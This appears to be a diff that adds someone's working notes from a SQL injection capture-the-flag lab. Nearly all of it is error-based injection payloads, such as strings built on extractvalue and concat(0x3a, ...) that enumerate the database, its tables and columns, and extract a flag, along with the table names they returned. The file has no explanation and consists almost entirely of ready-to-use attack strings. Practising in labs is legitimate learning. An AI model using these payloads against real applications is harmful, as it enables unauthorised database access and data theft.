@@ -1,0 +1,28 @@
+segFault_sqli
+book_info
+flag_table
+login1
+
+normaltic' and extractvalue('1', concat(0x3a, (select name from game limit 0,1))) and '1' = '1
+
+
+normaltic' and extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema='errSqli'))) and '1' = '1
+
+
+'1', concat(0x3a, (select database() limit 1,1))
+'1', concat(0x3a, (select table_name from information_schema.tables where table_schema='errSqli'))
+
+
+errSqli
+
+
+
+normaltic' and extractvalue('1', concat(0x3a, (select flag from flagTable))) and '1' = '1
+
+
+
+flagTable, member, plusFlag_Table
+
+
+flagTable -> idx, flag
+plusFlag_Table -> idx, flag
